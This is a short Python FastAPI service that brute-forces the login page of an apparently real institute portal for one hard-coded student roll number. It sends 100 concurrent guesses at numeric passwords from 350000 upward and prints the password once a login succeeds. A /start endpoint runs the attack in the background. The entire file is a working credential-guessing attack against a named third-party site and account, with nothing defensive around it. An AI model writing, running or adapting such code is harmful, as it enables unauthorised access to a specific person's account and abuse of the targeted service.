from fastapi import FastAPI
import asyncio
import aiohttp

app = FastAPI()

URL = "https://app.biomeinstitute.in/weblogin/"
ROLL = "25002833"
THREADS = 100  # Adjust for speed vs stability


async def try_password(session, password):
    payload = {
        "sublogin": "1",
        "username": ROLL,
        "password": str(password),
        "Login": "Secure Login"
    }
    headers = {"Content-Type": "application/x-www-form-urlencoded"}

    async with session.post(URL, data=payload, headers=headers) as response:
        text = await response.text()
        if "Invalid your username and password" not in text:
            print("\n===========================================")
            print(f"SUCCESS! Roll: {ROLL}  Password: {password}")
            print("===========================================\n")
            return True
    return False


async def main_bruteforce():
    async with aiohttp.ClientSession() as session:
        tasks = []
        for password in range(350000, 999999):
            task = asyncio.create_task(try_password(session, password))
            tasks.append(task)

            if len(tasks) >= THREADS:
                results = await asyncio.gather(*tasks)
                if any(results):
                    break
                tasks.clear()


@app.get("/")
async def root():
    return {"status": "Service is live. Go to /start to begin brute force."}


@app.get("/start")
async def start_task():
    asyncio.create_task(main_bruteforce())
    return {"status": "Brute force started in background!"}
